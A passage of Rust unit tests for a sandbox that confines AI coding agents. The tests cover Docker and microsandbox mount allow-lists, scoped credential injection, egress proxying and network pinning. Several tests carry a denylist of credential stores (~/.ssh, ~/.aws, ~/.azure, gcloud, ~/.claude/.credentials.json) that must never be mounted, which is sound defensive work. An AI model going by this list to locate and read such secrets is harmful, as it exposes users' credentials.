        let spec = CommandSpec {
            program: "sh".to_owned(),
            args: vec![],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();
        // `-w` should fall back to the project root when no cwd is set.
        let w = wrapped.args.iter().position(|a| a == "-w").unwrap();
        assert_eq!(wrapped.args[w + 1], "/srv/app");
    }

    /// M3: the container's HOME is a host-visible per-session dir, so the store
    /// root is reachable (Some) and resume-capture can read it back.
    #[test]
    fn docker_session_store_root_is_the_session_mount() {
        let session = DockerSession {
            image: "img".to_owned(),
            project_root: PathBuf::from("/proj"),
            mounts: vec![],
            egress_pins: vec![],
            egress_hosts: vec![],
            session_store: PathBuf::from("/var/varda/sessions/s1"),
            volume: "varda-sbx-s1".to_owned(),
            container: "varda-sbx-s1".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        assert_eq!(
            session.session_store_root(),
            Some(PathBuf::from("/var/varda/sessions/s1"))
        );
    }

    /// M9: the docker store is NOT live during the run — it lives in a volume and
    /// is only materialized on the host by `extract_session_store` afterwards.
    #[test]
    fn docker_store_is_not_live() {
        let session =
            DockerSession::for_test("img", "/proj", vec![], vec![], "/var/varda/sessions/s1");
        assert!(!session.store_is_live());
    }

    /// M9 fail-loud guard: a bind-mount SOURCE that does not exist on the host
    /// (a would-be empty in-VM stub on a VM-backed daemon) is rejected loudly,
    /// naming the offending path — both for the project root and for extra mounts.
    #[test]
    fn docker_validate_mounts_errors_on_unreachable_source() {
        // Bogus project root.
        let bad_project = DockerSession::for_test(
            "img",
            "/nonexistent/varda-m9-project",
            vec![],
            vec![],
            "/var/varda/sessions/s1",
        );
        let err = bad_project
            .validate_mounts()
            .expect_err("nonexistent project mount source must fail loudly");
        assert!(
            err.to_string().contains("/nonexistent/varda-m9-project")
                && err.to_string().contains("empty stub"),
            "unexpected error: {err:#}"
        );

        // Existing project, bogus extra mount source.
        let real_project = std::env::temp_dir();
        let bad_mount = DockerSession::for_test(
            "img",
            &real_project.display().to_string(),
            vec![(
                MountOrigin::Route,
                "/nonexistent/varda-m9-context:/ctx".to_owned(),
            )],
            vec![],
            "/var/varda/sessions/s1",
        );
        let err = bad_mount
            .validate_mounts()
            .expect_err("nonexistent extra mount source must fail loudly");
        assert!(
            err.to_string().contains("/nonexistent/varda-m9-context"),
            "unexpected error: {err:#}"
        );
    }

    /// M9: `validate_mounts` passes when every bind source exists on the host.
    #[test]
    fn docker_validate_mounts_ok_when_sources_exist() {
        let real = std::env::temp_dir();
        let real = real.display().to_string();
        let session = DockerSession::for_test(
            "img",
            &real,
            vec![(MountOrigin::Sandbox, format!("{real}:/ctx:ro"))],
            vec![],
            "/var/varda/sessions/s1",
        );
        assert!(session.validate_mounts().is_ok());
    }

    /// M2 mount allow-list: the project root is always mounted; extra `mounts`
    /// are added read-only and nothing else appears. With no extra mounts, only
    /// the single project bind mount is present.
    #[test]
    fn docker_wrap_mounts_only_project_root_by_default() {
        let session = DockerSession {
            image: "img".to_owned(),
            project_root: PathBuf::from("/srv/app"),
            mounts: vec![],
            egress_pins: vec![],
            egress_hosts: vec![],
            session_store: PathBuf::from("/var/varda/sessions/s1"),
            volume: "varda-sbx-s1".to_owned(),
            container: "varda-sbx-s1".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let mounts: Vec<&String> = wrapped
            .args
            .iter()
            .enumerate()
            .filter(|(i, _)| *i > 0 && wrapped.args[i - 1] == "-v")
            .map(|(_, v)| v)
            .collect();
        // Project root plus the per-session HOME mount; nothing else.
        assert_eq!(
            mounts,
            vec!["/srv/app:/srv/app", "varda-sbx-s1:/home/agent"]
        );
    }

    /// M2 mount allow-list: an explicit extra mount is bind-mounted read-only.
    #[test]
    fn docker_wrap_adds_extra_mounts_read_only() {
        let session = DockerSession {
            image: "img".to_owned(),
            project_root: PathBuf::from("/srv/app"),
            mounts: vec![(MountOrigin::Sandbox, "/opt/cache".to_owned())],
            egress_pins: vec![],
            egress_hosts: vec![],
            session_store: PathBuf::from("/var/varda/sessions/s1"),
            volume: "varda-sbx-s1".to_owned(),
            container: "varda-sbx-s1".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let mounts: Vec<&String> = wrapped
            .args
            .iter()
            .enumerate()
            .filter(|(i, _)| *i > 0 && wrapped.args[i - 1] == "-v")
            .map(|(_, v)| v)
            .collect();
        // Project root, then the per-session HOME mount, then the read-only extra.
        assert_eq!(
            mounts,
            vec![
                "/srv/app:/srv/app",
                "varda-sbx-s1:/home/agent",
                "/opt/cache:/opt/cache:ro"
            ]
        );
    }

    /// Helper: collect the `-e K=V` env flags out of a docker argv.
    #[cfg(test)]
    fn docker_env_flags(args: &[String]) -> Vec<&String> {
        args.iter()
            .enumerate()
            .filter(|(i, _)| *i > 0 && args[i - 1] == "-e")
            .map(|(_, v)| v)
            .collect()
    }

    /// Helper: collect the `-v` bind mounts out of a docker argv.
    #[cfg(test)]
    fn docker_v_flags(args: &[String]) -> Vec<&String> {
        args.iter()
            .enumerate()
            .filter(|(i, _)| *i > 0 && args[i - 1] == "-v")
            .map(|(_, v)| v)
            .collect()
    }

    /// M11 empty bundle is a no-op: the argv is byte-for-byte the pre-M11 one
    /// (only the project + per-session HOME mounts, no extra env beyond HOME).
    #[test]
    fn m11_empty_identity_is_a_noop() {
        let id = SandboxIdentity::default();
        assert!(id.is_empty());
        let session =
            DockerSession::for_test_with_identity("img", "/srv/app", "/var/varda/sessions/s1", id);
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        assert_eq!(
            docker_v_flags(&wrapped.args),
            vec!["/srv/app:/srv/app", "varda-sbx-s1:/home/agent"]
        );
        assert_eq!(docker_env_flags(&wrapped.args), vec!["HOME=/home/agent"]);
    }

    /// M11 channel 1 (auth token): a resolved scoped token lands as an in-box `-e`
    /// env var and NO credential dir is ever bind-mounted.
    #[test]
    fn m11_auth_token_injected_as_scoped_env_no_creds_mount() {
        let mut auth_env = BTreeMap::new();
        auth_env.insert(
            "ANTHROPIC_API_KEY".to_owned(),
            "sk-scoped-sandbox".to_owned(),
        );
        let id = SandboxIdentity {
            auth_env,
            ..Default::default()
        };
        let session =
            DockerSession::for_test_with_identity("img", "/srv/app", "/var/varda/sessions/s1", id);
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "claude".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        assert!(
            docker_env_flags(&wrapped.args)
                .iter()
                .any(|e| *e == "ANTHROPIC_API_KEY=sk-scoped-sandbox"),
            "auth token must be injected as a scoped -e env var: {:?}",
            wrapped.args
        );
        // Exit criterion: no `.claude`/`.aws`/`.ssh` bind mount anywhere in the argv.
        for v in docker_v_flags(&wrapped.args) {
            assert!(
                !v.contains("/.claude")
                    && !v.contains("/.aws")
                    && !v.contains("/.ssh")
                    && !v.contains("/.codex")
                    && !v.contains("/.copilot"),
                "no credential dir may be mounted: {v}"
            );
        }
    }

    /// M11-ext: a MULTI-credential run mixes an env target and a file target. The env
    /// target lands as a scoped `-e`; the file target flows through
    /// [`SandboxSession::identity_files`] → `stage_file` (staged, never a mount). NO
    /// credential dir (`~/.config/gcloud`, `~/.aws`, `~/.azure`, `~/.terraform.d`) is
    /// ever bind-mounted.
    #[test]
    fn m11ext_multi_credential_env_and_file_targets_no_creds_mount() {
        let mut auth_env = BTreeMap::new();
        auth_env.insert(
            "CLOUDSDK_AUTH_ACCESS_TOKEN".to_owned(),
            "scoped-access-token".to_owned(),
        );
        let mut auth_files = BTreeMap::new();
        auth_files.insert(
            "/home/agent/.config/gcloud-token".to_owned(),
            "scoped-file-token".to_owned(),
        );
        let id = SandboxIdentity {
            auth_env,
            auth_files,
            ..Default::default()
        };
        assert!(
            !id.is_empty(),
            "a file-only credential still activates identity wiring"
        );
        let session =
            DockerSession::for_test_with_identity("img", "/srv/app", "/var/varda/sessions/s1", id);
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "claude".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        // Env target injects as a scoped -e; the file target is NOT an env var.
        let env = docker_env_flags(&wrapped.args);
        assert!(
            env.iter()
                .any(|e| *e == "CLOUDSDK_AUTH_ACCESS_TOKEN=scoped-access-token"),
            "env-target credential must be a scoped -e: {env:?}"
        );
        // No credential dir/file is ever a bind-mount SOURCE — not even the file target.
        for v in docker_v_flags(&wrapped.args) {
            assert!(
                !v.contains("gcloud-token")
                    && !v.contains("/.config/gcloud")
                    && !v.contains("/.aws")
                    && !v.contains("/.azure")
                    && !v.contains("/.terraform.d"),
                "no credential dir/file may be mounted: {v}"
            );
        }
        // The file target is exposed as a staged read-only guest file, not a mount.
        let files = session.identity_files();
        assert_eq!(
            files
                .get("/home/agent/.config/gcloud-token")
                .map(String::as_str),
            Some("scoped-file-token")
        );
        let guest = session
            .stage_file("scoped-file-token", "/home/agent/.config/gcloud-token")
            .unwrap();
        assert_eq!(guest, "/home/agent/.config/gcloud-token");
        // stage_file leaks nothing under test: drop the host temp it wrote.
        for (host_temp, _) in session.staged_files.lock().unwrap().drain(..) {
            let _ = std::fs::remove_file(&host_temp);
        }
    }

    /// M11-ext Finding 1: a CONFIGURED mount (any origin) of `~/.azure` or
    /// `~/.terraform.d` — both in our documented cloud recipes — is REFUSED. Proven
    /// two ways: the denylist predicate rejects the resolved source, AND a docker
    /// `wrap()` carrying such a mount fails (the real rejection path a launch takes).
    #[test]
    fn m11ext_credential_denylist_rejects_azure_and_terraform() {
        let home = std::env::var("HOME").expect("HOME set in tests");
        for entry in ["/.azure", "/.terraform.d", "/.azure/accessTokens.json"] {
            let src = PathBuf::from(format!("{home}{entry}"));
            assert!(
                check_credential_denylist(&src).is_err(),
                "expected {entry} to be denied by the credential denylist"
            );
        }
        // Exercise the actual launch-time rejection path: a route/central-config
        // mount of either dir must make docker `wrap` bail, not silently mount it.
        for raw in ["~/.azure:/creds", "~/.terraform.d:/tf"] {
            let session = DockerSession::for_test(
                "img",
                "/srv/app",
                vec![(MountOrigin::Route, raw.to_owned())],
                vec![],
                "/var/varda/sessions/s1",
            );
            let err = session
                .wrap(
                    CommandSpec {
                        program: "claude".to_owned(),
                        args: vec![],
                        env: BTreeMap::new(),
                        cwd: None,
                    },
                    LaunchMode::Batch,
                )
                .expect_err("a configured mount of a credential store must be refused");
            let msg = format!("{err:#}");
            assert!(
                msg.contains("credential/identity store"),
                "rejection must cite the credential denylist, got: {msg}"
            );
        }
    }

    /// M11-ext Finding 2 (docker): a BATCH run with a `file`-target credential
    /// actually delivers the value into the guest. Staging writes a READ-ONLY host
    /// temp and, because a copy must precede the agent, batch `wrap` switches to the
    /// `docker create` (not `run`) lifecycle so `begin_batch` can `docker cp` it in.
    /// Teardown removes the host temp — no credential value is left behind.
    #[tokio::test]
    async fn m11ext_batch_file_target_delivered_and_cleaned_docker() {
        use std::os::unix::fs::PermissionsExt as _;
        let mut auth_files = BTreeMap::new();
        auth_files.insert(
            "/home/agent/.azure-token".to_owned(),
            "scoped-value-docker".to_owned(),
        );
        let id = SandboxIdentity {
            auth_files,
            ..Default::default()
        };
        let session = Box::new(DockerSession::for_test_with_identity(
            "img",
            "/srv/app",
            "/var/varda/sessions/s1",
            id,
        ));
        // Stage exactly as `stage_identity_files` does for a batch launch.
        for (guest_path, value) in session.identity_files() {
            let advertised = session.stage_credential_file(&value, &guest_path).unwrap();
            assert_eq!(advertised, guest_path);
        }
        // The host temp holds the value and is read-only (0o400) — not left mutable.
        let host_temp = {
            let staged = session.staged_files.lock().unwrap();
            assert_eq!(staged.len(), 1, "one file-target credential staged");
            assert_eq!(staged[0].1, "/home/agent/.azure-token");
            let path = staged[0].0.clone();
            assert_eq!(
                std::fs::read_to_string(&path).unwrap(),
                "scoped-value-docker"
            );
            let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
            assert_eq!(
                mode, 0o444,
                "staged credential must be guest-readable, got {mode:o}"
            );
            assert_credential_dir_is_private(&path);
            path
        };
        // Batch with a staged file takes the `create` → cp → `start -ai` lifecycle
        // (so the credential can be copied in BEFORE the agent runs), NOT `docker run`.
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "claude".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        assert_eq!(wrapped.args.first().map(String::as_str), Some("create"));
        assert!(
            wrapped.args.iter().any(|a| a == "-i"),
            "batch keeps stdin open"
        );
        assert!(
            !wrapped.args.iter().any(|a| a == "-t"),
            "batch must not allocate a TTY"
        );
        // The credential is delivered by copy, never as a host bind mount.
        for v in docker_v_flags(&wrapped.args) {
            assert!(
                !v.contains(".azure-token"),
                "credential must not be bind-mounted: {v}"
            );
        }
        // Teardown removes the staged host temp (best-effort docker rm needs no daemon).
        assert!(host_temp.exists());
        session.teardown().await.unwrap();
        assert!(
            !host_temp.exists(),
            "teardown must remove the staged credential host temp"
        );
    }

    /// M11-ext Finding 2 (msb): a BATCH run with a `file`-target credential reaches
    /// the guest via a pre-boot `--copy-file` (emitted in EITHER mode now), the host
    /// temp is read-only, and teardown removes it.
    #[tokio::test]
    async fn m11ext_batch_file_target_delivered_and_cleaned_msb() {
        use std::os::unix::fs::PermissionsExt as _;
        let mut auth_files = BTreeMap::new();
        auth_files.insert(
            "/home/agent/.tf-token".to_owned(),
            "scoped-value-msb".to_owned(),
        );
        let session = Box::new(MicrosandboxSession {
            image: "busybox".to_owned(),
            project_root: PathBuf::from("/proj"),
            mounts: Vec::new(),
            egress: Vec::new(),
            session_store: PathBuf::from("/host/store"),
            sandbox: "varda-sbx-abc".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity {
                auth_files,
                ..Default::default()
            },
            staged_files: std::sync::Mutex::new(Vec::new()),
        });
        for (guest_path, value) in session.identity_files() {
            session.stage_credential_file(&value, &guest_path).unwrap();
        }
        let host_temp = session.staged_files.lock().unwrap()[0].0.clone();
        let mode = std::fs::metadata(&host_temp).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o444,
            "staged credential must be guest-readable, got {mode:o}"
        );
        assert_credential_dir_is_private(&host_temp);
        // BATCH wrap emits a `--copy-file host:guest` for the staged credential and
        // still no TTY — the fix over the old "interactive-only copy" behavior.
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        assert!(
            !wrapped.args.iter().any(|a| a == "-t"),
            "batch must not allocate a TTY"
        );
        let copy_idx = wrapped
            .args
            .iter()
            .position(|a| a == "--copy-file")
            .expect("batch msb must deliver the file-target credential via --copy-file");
        assert!(
            wrapped.args[copy_idx + 1].ends_with(":/home/agent/.tf-token"),
            "copy-file target must be the guest credential path, got {}",
            wrapped.args[copy_idx + 1]
        );
        assert!(host_temp.exists());
        session.teardown().await.unwrap();
        assert!(
            !host_temp.exists(),
            "teardown must remove the staged credential host temp"
        );
    }

    /// M11 channel 2 (git identity): SSH_AUTH_SOCK is forwarded as a bind + env, and
    /// the read-only git identity is forwarded as GIT_AUTHOR_*/GIT_COMMITTER_* env —
    /// no private key ever enters the box.
    #[test]
    fn m11_ssh_agent_and_git_identity_forwarded() {
        let id = SandboxIdentity {
            ssh_auth_sock: Some("/tmp/agent.sock".to_owned()),
            git_name: Some("Ada Lovelace".to_owned()),
            git_email: Some("ada@example.com".to_owned()),
            ..Default::default()
        };
        let session =
            DockerSession::for_test_with_identity("img", "/srv/app", "/var/varda/sessions/s1", id);
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        // Socket forwarded as a bind mount to the fixed in-guest path.
        assert!(
            docker_v_flags(&wrapped.args)
                .iter()
                .any(|v| *v == "/tmp/agent.sock:/ssh-agent"),
            "ssh agent socket must be forwarded: {:?}",
            wrapped.args
        );
        let env = docker_env_flags(&wrapped.args);
        for expected in [
            "SSH_AUTH_SOCK=/ssh-agent",
            "GIT_AUTHOR_NAME=Ada Lovelace",
            "GIT_COMMITTER_NAME=Ada Lovelace",
            "GIT_AUTHOR_EMAIL=ada@example.com",
            "GIT_COMMITTER_EMAIL=ada@example.com",
        ] {
            assert!(
                env.iter().any(|e| e.as_str() == expected),
                "missing env {expected}: {env:?}"
            );
        }
        // No private key material is ever a mount source.
        for v in docker_v_flags(&wrapped.args) {
            assert!(
                !v.contains("id_rsa") && !v.contains("/.ssh"),
                "no key mount: {v}"
            );
        }
    }

    /// M11 channel 3 (curated identity file): a specific read-only FILE is mounted;
    /// a credential file under the same denylisted dir is refused.
    #[test]
    fn m11_curated_identity_file_mounts_ro_but_credential_file_refused() {
        // Curated file lives inside a tmp dir (a real FILE, not a dir).
        let dir = std::env::temp_dir().join("varda-m11-identity");
        let _ = std::fs::create_dir_all(&dir);
        let file = dir.join("PROFILE.md");
        std::fs::write(&file, "# who I am\n").unwrap();
        let id = SandboxIdentity {
            identity_context: vec![format!("{}:/root/PROFILE.md:ro", file.display())],
            ..Default::default()
        };
        let session =
            DockerSession::for_test_with_identity("img", "/srv/app", "/var/varda/sessions/s1", id);
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        assert!(
            docker_v_flags(&wrapped.args)
                .iter()
                .any(|v| v.ends_with(":/root/PROFILE.md:ro")),
            "curated identity file must be mounted read-only: {:?}",
            wrapped.args
        );

        // A credential file (even if named explicitly) is refused at wrap time.
        let creds = dir.join(".credentials.json");
        std::fs::write(&creds, "{}").unwrap();
        let bad = SandboxIdentity {
            identity_context: vec![format!("{}:/root/.credentials.json:ro", creds.display())],
            ..Default::default()
        };
        let bad_session =
            DockerSession::for_test_with_identity("img", "/srv/app", "/var/varda/sessions/s1", bad);
        assert!(
            bad_session
                .wrap(
                    CommandSpec {
                        program: "sh".to_owned(),
                        args: vec![],
                        env: BTreeMap::new(),
                        cwd: None,
                    },
                    LaunchMode::Batch
                )
                .is_err(),
            "a credential file must never mount as curated identity"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// P3 regression: a curated file INSIDE a denylisted dir (e.g. `~/.claude/CLAUDE.md`)
    /// is the sanctioned `identity_context` hatch. The blanket credential-DIR denylist
    /// (used for normal mounts) rejects it, but the identity_context path uses the M8
    /// control-plane floor + file validation, which ALLOW the curated file while still
    /// refusing the credential file and `~/.varda`.
    #[test]
    fn identity_context_allows_curated_file_inside_denylisted_dir() {
        let Some(home) = home_dir() else {
            return; // No HOME in this env; nothing to assert.
        };
        let curated = home.join(".claude/CLAUDE.md");
        // Normal mounts: the blanket denylist rejects ANYTHING under ~/.claude...
        assert!(
            check_credential_denylist(&curated).is_err(),
            "the blanket credential denylist should reject a ~/.claude path for normal mounts"
        );
        // ...but the identity_context path allows a curated file inside it when
        // the configured file really exists. If this developer environment does
        // not have that file, the same path must fail as a missing file rather
        // than slipping through to an empty bind mount.
        assert!(
            check_control_plane_denylist(&curated).is_ok(),
            "control-plane floor must not reject a curated identity file under ~/.claude"
        );
        if curated.is_file() {
            assert!(
                check_identity_context_mount(&curated, false).is_ok(),
                "a curated read-only file inside ~/.claude must be allowed as identity_context"
            );
        } else {
            assert!(
                check_identity_context_mount(&curated, false).is_err(),
                "a missing curated identity_context path must be rejected"
            );
        }
        // The credential file itself is still refused by identity validation.
        assert!(
            check_identity_context_mount(&home.join(".claude/.credentials.json"), false).is_err(),
            "the credential file must never mount, even via identity_context"
        );
        // And ~/.varda (control plane) is refused even on the identity path.
        assert!(
            check_control_plane_denylist(&home.join(".varda/config.toml")).is_err(),
            "the control plane must never mount, even via identity_context"
        );
    }

    /// M2 egress: no allow-list ⇒ fully offline (`--network none`, no DNS/host
    /// overrides).
    #[test]
    fn docker_wrap_no_egress_is_network_none() {
        let session = DockerSession {
            image: "img".to_owned(),
            project_root: PathBuf::from("/srv/app"),
            mounts: vec![],
            egress_pins: vec![],
            egress_hosts: vec![],
            session_store: PathBuf::from("/var/varda/sessions/s1"),
            volume: "varda-sbx-s1".to_owned(),
            container: "varda-sbx-s1".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let n = wrapped.args.iter().position(|a| a == "--network").unwrap();
        assert_eq!(wrapped.args[n + 1], "none");
        assert!(!wrapped.args.iter().any(|a| a == "--add-host"));
        assert!(!wrapped.args.iter().any(|a| a == "--dns"));
    }

    /// M2 egress allow-list: declared hosts switch the container to `bridge`,
    /// disable ambient DNS, and pin exactly the allow-listed hosts to their IPs.
    #[test]
    fn docker_wrap_egress_pins_allow_listed_hosts() {
        let session = DockerSession {
            image: "img".to_owned(),
            project_root: PathBuf::from("/srv/app"),
            mounts: vec![],
            egress_pins: vec![
                ("api.example.com".to_owned(), "93.184.216.34".to_owned()),
                ("cdn.example.com".to_owned(), "203.0.113.7".to_owned()),
            ],
            egress_hosts: vec![],
            session_store: PathBuf::from("/var/varda/sessions/s1"),
            volume: "varda-sbx-s1".to_owned(),
            container: "varda-sbx-s1".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let n = wrapped.args.iter().position(|a| a == "--network").unwrap();
        assert_eq!(wrapped.args[n + 1], "bridge");
        let d = wrapped.args.iter().position(|a| a == "--dns").unwrap();
        assert_eq!(wrapped.args[d + 1], "0.0.0.0");
        let add_hosts: Vec<&String> = wrapped
            .args
            .iter()
            .enumerate()
            .filter(|(i, _)| *i > 0 && wrapped.args[i - 1] == "--add-host")
            .map(|(_, v)| v)
            .collect();
        assert_eq!(
            add_hosts,
            vec![
                "api.example.com:93.184.216.34",
                "cdn.example.com:203.0.113.7"
            ]
        );
    }

    /// Proxy mode: the box joins the per-session INTERNAL network (no direct route
    /// out) and gets `HTTP(S)_PROXY` pointing at the forward-proxy alias, so a denied
    /// host is genuinely unroutable while allow-listed hosts reach the proxy. No
    /// `--dns`/`--add-host` (the proxy resolves on the box's behalf).
    #[test]
    fn docker_wrap_proxy_mode_confines_to_internal_net_and_sets_proxy_env() {
        let session = DockerSession {
            image: "img".to_owned(),
            project_root: PathBuf::from("/srv/app"),
            mounts: vec![],
            egress_pins: vec![],
            egress_hosts: vec!["api.anthropic.com".to_owned()],
            session_store: PathBuf::from("/var/varda/sessions/s1"),
            volume: "varda-sbx-s1".to_owned(),
            container: "varda-sbx-s1".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        };
        let wrapped = session
            .wrap(
                CommandSpec {
                    program: "sh".to_owned(),
                    args: vec![],
                    env: BTreeMap::new(),
                    cwd: None,
                },
                LaunchMode::Batch,
            )
            .unwrap();
        let n = wrapped.args.iter().position(|a| a == "--network").unwrap();
        assert_eq!(wrapped.args[n + 1], "varda-egnet-s1");
        assert!(!wrapped.args.iter().any(|a| a == "--dns"));
        assert!(!wrapped.args.iter().any(|a| a == "--add-host"));
        // HTTP(S)_PROXY (both cases) point at the forward-proxy alias.
        let envs: Vec<&String> = wrapped
            .args
            .iter()
            .enumerate()
            .filter(|(i, _)| *i > 0 && wrapped.args[i - 1] == "-e")
            .map(|(_, v)| v)
            .collect();
        for key in ["HTTP_PROXY", "http_proxy", "HTTPS_PROXY", "https_proxy"] {
            assert!(
                envs.contains(&&format!("{key}=http://egress-proxy:8888")),
                "missing {key}; got {envs:?}"
            );
        }
        assert!(
            envs.iter().any(|e| e.starts_with("NO_PROXY=")),
            "missing NO_PROXY; got {envs:?}"
        );
    }

    /// Docker now accepts a non-empty egress allow-list in EVERY mode: `strict`/
    /// `proxy` build the forward-proxy sidecar provider, `dns-pin` keeps the legacy
    /// `host:port` egress entries open CONNECT to that port and still filter on the
    /// bare host — tinyproxy never matches host:port — so a plain-http service on a
    /// non-default port is reachable by a Node client (undici CONNECT-tunnels even
    /// for http://) without widening the host allow-list.
    #[test]
    fn egress_host_port_opens_connect_port_and_filters_on_host() {
        let hosts = vec![
            "api.github.com".to_owned(),
            "host.docker.internal:8765".to_owned(),
        ];
        let conf = tinyproxy_conf(&hosts);
        assert!(conf.contains("ConnectPort 443\n"), "{conf}");
        assert!(conf.contains("ConnectPort 563\n"), "{conf}");
        assert!(conf.contains("ConnectPort 8765\n"), "{conf}");

        let filter = tinyproxy_filter(&hosts);
        assert!(filter.contains("^host\\.docker\\.internal$"), "{filter}");
        assert!(!filter.contains("8765"), "filter must match host only: {filter}");

        // A bare host list opens nothing beyond the defaults.
        let bare = tinyproxy_conf(&["api.github.com".to_owned()]);
        assert_eq!(bare.matches("ConnectPort").count(), 2, "{bare}");
    }

    /// `${env:NAME}` in an egress entry resolves from the host env; an unset variable
    /// drops the entry rather than allow-listing a literal `${env:...}` hostname.
    #[test]
    fn egress_entry_expands_env_placeholders() {
        // SAFETY: uniquely-named vars this test owns; set and removed within it.
        unsafe { std::env::set_var("VARDA_TEST_EGRESS_PORT", "54321") };
        assert_eq!(
            expand_egress_entry("host.docker.internal:${env:VARDA_TEST_EGRESS_PORT}").as_deref(),
            Some("host.docker.internal:54321")
        );
        unsafe { std::env::remove_var("VARDA_TEST_EGRESS_PORT") };
        assert_eq!(
            expand_egress_entry("host.docker.internal:${env:VARDA_TEST_EGRESS_PORT}"),
            None
        );
        // Entries without a placeholder are untouched.
        assert_eq!(
            expand_egress_entry("api.github.com").as_deref(),
            Some("api.github.com")
        );
        // Malformed placeholder drops rather than allow-listing garbage.
        assert_eq!(expand_egress_entry("host:${env:UNCLOSED"), None);
    }

    /// A port suffix is stripped before DNS-pin resolution/pinning, so `dns-pin`
    /// compatibility mode does not try to resolve "host:8765" as a hostname.
    #[test]
    fn split_egress_host_splits_only_numeric_ports() {
        assert_eq!(split_egress_host("api.github.com"), ("api.github.com", None));
        assert_eq!(
            split_egress_host("host.docker.internal:8765"),
            ("host.docker.internal", Some("8765"))
        );
        // Not a port: left intact rather than silently truncated.
        assert_eq!(split_egress_host("host:abc"), ("host:abc", None));
    }

    /// `--add-host` pins. None of them is refused at build time.
    #[test]
    fn docker_non_empty_egress_builds_in_all_modes() {
        for mode in [EgressMode::Strict, EgressMode::Proxy, EgressMode::DnsPin] {
            let mut sandboxes: BTreeMap<String, SandboxConfig> = BTreeMap::new();
            sandboxes.insert(
                "docker".to_owned(),
                SandboxConfig {
                    image: Some("varda:latest".to_owned()),
                    egress: vec!["api.example.com".to_owned()],
                    egress_mode: mode,
                    ..Default::default()
                },
            );
            assert_eq!(
                provider_for("docker", &sandboxes, &[], &SandboxIdentity::default())
                    .unwrap_or_else(|e| panic!("docker egress in {mode:?} must build: {e}"))
                    .name(),
                "docker",
                "mode {mode:?}"
            );
        }
    }

    #[test]
    fn local_non_empty_egress_is_rejected_even_with_dns_pin() {
        let config = SandboxConfig {
            primitive: "local".to_owned(),
            egress: vec!["api.example.com".to_owned()],
            egress_mode: EgressMode::DnsPin,
            ..Default::default()
        };
        let err = match provider_from_config(
            "local-ish",
            &config,
            Vec::new(),
            &SandboxIdentity::default(),
        ) {
            Ok(provider) => panic!(
                "local cannot enforce any egress mode, got provider '{}'",
                provider.name()
            ),
            Err(err) => err,
        };
        assert!(err.to_string().contains("no network isolation"), "{err}");
    }

    #[test]
    fn provider_for_local_and_docker() {
        let mut sandboxes: BTreeMap<String, SandboxConfig> = BTreeMap::new();
        assert_eq!(
            provider_for("local", &sandboxes, &[], &SandboxIdentity::default())
                .unwrap()
                .name(),
            "local"
        );

        // Unknown sandbox errors.
        assert!(provider_for("docker", &sandboxes, &[], &SandboxIdentity::default()).is_err());

        sandboxes.insert(
            "docker".to_owned(),
            SandboxConfig {
                image: Some("varda:latest".to_owned()),
                ..Default::default()
            },
        );
        assert_eq!(
            provider_for("docker", &sandboxes, &[], &SandboxIdentity::default())
                .unwrap()
                .name(),
            "docker"
        );

        // Missing image AND build errors under the docker primitive.
        sandboxes.insert(
            "broken".to_owned(),
            SandboxConfig {
                image: None,
